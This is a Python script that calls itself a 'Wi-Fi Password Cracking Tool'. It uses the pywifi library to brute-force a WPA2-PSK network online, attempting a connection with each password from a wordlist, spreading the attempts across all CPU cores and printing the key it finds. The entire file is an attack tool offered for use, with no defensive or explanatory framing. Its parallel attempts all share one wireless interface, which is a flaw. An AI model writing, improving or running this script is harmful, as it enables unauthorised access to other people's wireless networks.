import sys
import os
import os.path
import platform
import re
import time
import multiprocessing
import pywifi
import argparse
from pywifi import PyWiFi, const, Profile

try:
    # wlan
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    ifaces.scan() #check the card
    results = ifaces.scan_results()


    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except:
    print("[-] Error system")

type = False

def main(ssid, password):

    profile = Profile() 
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.5) 
    iface.connect(tmp_profile) # trying to Connect
    time.sleep(0.35) 

    if ifaces.status() == const.IFACE_CONNECTED: # checker
        time.sleep(1)
        print("[+] Password Found!")
        print("[+] Password is: " + password)
        time.sleep(1)
        return "Success"
    else:
        print('[-] Password Not Found! : ' + password)

def worker(ssid, password_list, result_queue):
    for password in password_list:
        result = main(ssid, password)
        if result == "Success":
            result_queue.put(password)
            break
    else:
        result_queue.put(None)  # Indicate that this process finished

def pwd(ssid, file):
    with open(file, 'r', encoding='utf8') as words:
        password_list = [line.strip() for line in words]

    num_processes = multiprocessing.cpu_count()
    result_queue = multiprocessing.Queue()
    processes = []

    chunk_size = len(password_list) // num_processes
    password_chunks = [password_list[i:i+chunk_size] for i in range(0, len(password_list), chunk_size)]

    for chunk in password_chunks:
        p = multiprocessing.Process(target=worker, args=(ssid, chunk, result_queue))
        processes.append(p)
        p.start()

    # Wait for processes to finish
    for p in processes:
        p.join()

    while not result_queue.empty():
        password = result_queue.get()
        if password is not None:
            print("[+] Password Found!")
            print("[+] Password is: " + password)
            break



def menu():
    parser = argparse.ArgumentParser(description="Wi-Fi Password Cracking Tool")
    parser.add_argument("-s", "--ssid", required=True, help="SSID (Wi-Fi network name)")
    parser.add_argument("-f", "--file", required=True, help="Passwords File")
    args = parser.parse_args()

    ssid = args.ssid
    file = args.file

    if os.path.exists(file):
        print("[~] Cracking...")
        pwd(ssid, file)
    else:
        print("[-] File Not Found!")

if __name__ == "__main__":
    menu()

